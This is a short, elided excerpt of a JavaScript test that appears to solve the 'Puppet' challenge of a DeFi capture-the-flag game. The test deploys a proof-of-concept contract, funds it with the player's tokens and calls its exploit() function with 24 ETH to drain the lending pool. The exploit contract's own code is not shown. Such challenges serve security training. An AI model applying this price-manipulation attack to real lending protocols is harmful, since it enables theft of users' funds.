...
describe('[Challenge] Puppet', function () {
    ...
    it('Execution', async function () {
        ...
        const poc = await (await ethers.getContractFactory("Puppet_POC", player2)).connect(player2).deploy(lendingPool.address, token.address, uniswapExchange.address);

        await token.connect(player).transfer(poc.address, await token.balanceOf(player.address));

        await poc.connect(player2).exploit({ value: 24n * 10n ** 18n });
        await token.connect(player2).transfer(player.address, await token.balanceOf(player2.address))
    });
